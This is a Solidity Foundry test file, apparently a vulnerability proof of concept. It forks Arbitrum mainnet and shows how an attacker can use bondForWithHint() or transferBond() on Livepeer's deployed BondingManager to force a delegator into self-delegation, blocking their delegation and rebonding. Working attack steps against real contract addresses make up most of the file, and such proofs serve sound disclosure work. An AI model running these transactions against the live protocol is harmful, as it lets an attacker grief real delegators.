pragma solidity ^0.8.9;

import "ds-test/test.sol";
import "./base/GovernorBaseTest.sol";
import "contracts/bonding/BondingManager.sol";
import "contracts/rounds/RoundsManager.sol";
import "contracts/token/LivepeerToken.sol";
import "./interfaces/ICheatCodes.sol";

// forge test --match-contract BondingManagerForceSelfDelegationPoC --fork-url https://arbitrum-mainnet.infura.io/v3/<INFURA_KEY> -vvv --fork-block-number 104182839
contract BondingManagerForceSelfDelegationPoC is GovernorBaseTest {
    BondingManager public constant BONDING_MANAGER = BondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
    RoundsManager public constant ROUNDS_MANAGER = RoundsManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);
    LivepeerToken public constant TOKEN = LivepeerToken(0x289ba1701C2F088cf0faf8B3705246331cB8A839);

    address public constant MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;

    uint256 public testAccountCtr = 1;
    address public attacker;
    address public delegator;
    address public transcoder;

    function newAddr() public returns (address) {
        address addr = CHEATS.addr(testAccountCtr);
        testAccountCtr++;
        return addr;
    }

    function setUp() public {
        // Setup accounts
        attacker = newAddr();
        delegator = newAddr();
        transcoder = newAddr();

        uint256 mockAllow = 1000;

        CHEATS.startPrank(MINTER);
        TOKEN.mint(attacker, mockAllow);
        TOKEN.mint(delegator, mockAllow);
        CHEATS.stopPrank();

        CHEATS.prank(attacker);
        TOKEN.approve(address(BONDING_MANAGER), mockAllow);

        CHEATS.prank(delegator);
        TOKEN.approve(address(BONDING_MANAGER), mockAllow);
    }

    function testBondForWithHintPoC() public {
        // Attacker calls bondForWithHint() to force the delegator to self-delegate at the cost of 1 aLPT
        CHEATS.prank(attacker);
        BONDING_MANAGER.bondForWithHint(1, delegator, delegator, address(0), address(0), address(0), address(0));

        // Delegator bond() tx fails because it is now a registered transcoder and is trying to change delegation
        CHEATS.startPrank(delegator);
        CHEATS.expectRevert("registered transcoders can't delegate towards other addresses");
        BONDING_MANAGER.bond(1, transcoder);

        // Delegator needs to wait until next round to unbond
        // This is the next round start block assuming 104182839 is the fork block number
        uint256 nextRoundStartBlock = 17545330;
        CHEATS.roll(nextRoundStartBlock);
        ROUNDS_MANAGER.initializeRound();

        BONDING_MANAGER.unbond(1);
        CHEATS.stopPrank();

        // Attacker calls bondForWithHint() to force delegator to self-delegate AFTER the full unbond and BEFORE the rebondFromUnbonded() call
        CHEATS.prank(attacker);
        BONDING_MANAGER.bondForWithHint(1, delegator, delegator, address(0), address(0), address(0), address(0));

        // Delegator can call rebondFromUnbonded() with its unbonding lock to delegate to a different address, but...
        // Delegator rebondFromUnbonded() tx fails because it needs to be in the Unbonded state and the attacker's tx forced it into the Pending state
        CHEATS.startPrank(delegator);
        CHEATS.expectRevert("caller must be unbonded");
        BONDING_MANAGER.rebondFromUnbonded(transcoder, 0);

        // Attacker can prevent a delegator address from delegating to a separate address by calling bondForWithHint() to force the address to self-delegate at the cost of 1 aLPT
        // whenever the delegator address is in the Unbonded state
    }

    function testTransferBondPoC() public {
        // Attacker needs to delegate to the delegator first before it can call transferBond()
        CHEATS.prank(attacker);
        BONDING_MANAGER.bond(100, delegator);

        // Attacker needs to wait 1 round before it can call transferBond()
        // This is the next round start block assuming 104182839 is the fork block number
        uint256 nextRoundStartBlock = 17545330;
        CHEATS.roll(nextRoundStartBlock);
        ROUNDS_MANAGER.initializeRound();

        // Attacker calls transferBond() to force the delegator to self-delegate at the cost of 1 aLPT
        CHEATS.prank(attacker);
        BONDING_MANAGER.transferBond(delegator, 1, address(0), address(0), address(0), address(0));

        // Delegator bond() tx fails because it is now a registered transcoder and is trying to change delegation
        CHEATS.startPrank(delegator);
        CHEATS.expectRevert("registered transcoders can't delegate towards other addresses");
        BONDING_MANAGER.bond(1, transcoder);

        // Delegator needs to wait until next round to unbond
        nextRoundStartBlock = 17545330 + ROUNDS_MANAGER.roundLength();
        CHEATS.roll(nextRoundStartBlock);
        ROUNDS_MANAGER.initializeRound();

        BONDING_MANAGER.unbond(1);
        CHEATS.stopPrank();

        // Attacker calls transferBond() to force delegator to self-delegate AFTER the full unbond and BEFORE the rebondFromUnbonded() call
        CHEATS.prank(attacker);
        BONDING_MANAGER.transferBond(delegator, 1, address(0), address(0), address(0), address(0));

        // Delegator can call rebondFromUnbonded() with its unbonding lock to delegate to a different address, but...
        // Delegator rebondFromUnbonded() tx fails because it needs to be in the Unbonded state and the attacker's tx forced it into the Pending state
        CHEATS.startPrank(delegator);
        CHEATS.expectRevert("caller must be unbonded");
        BONDING_MANAGER.rebondFromUnbonded(transcoder, 0);

        // Attacker can prevent a delegator address from delegating to a separate address by calling transferBond() to force the address to self-delegate at the cost of 1 aLPT
        // whenever the delegator address is in the Unbonded state
    }
}
